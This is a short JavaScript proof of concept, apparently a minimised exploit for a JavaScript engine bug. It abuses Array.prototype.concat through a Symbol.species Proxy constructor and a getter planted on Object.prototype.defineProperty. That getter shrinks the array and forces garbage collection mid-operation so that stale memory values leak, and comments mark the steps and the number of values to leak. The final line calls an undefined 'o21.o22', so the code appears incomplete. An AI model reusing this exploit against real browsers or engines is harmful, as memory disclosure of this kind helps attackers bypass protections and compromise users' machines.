var o0 = new Proxy([], {});
var o2 = Object.prototype.defineProperty;

class o6 extends Array {
    static get [Symbol.species]() {
        return function() { return o0; }
    }; // custom constructor which returns a proxy object
}

var o10 = new o6(100);
o10[1] = 0.1;
o10[2] = 0.1;

function o11() {
    for (var o12 = 0; o12 < 0x100000; ++o12) {
        var o13 = new String();
    }
}

function o15() {
    o10.length = 1; // shorten the array so the backstore pointer is relocated
    o11();         // force gc to move the array's elements backstore
    return o2;
}

Object.prototype.__defineGetter__("defineProperty", o15);

var o18 = Array.prototype.concat.call(o10);

for (var o12 = 0; o12 < 20; o12++) { // however many values you want to leak
    o21.o22(o18[o12]);
}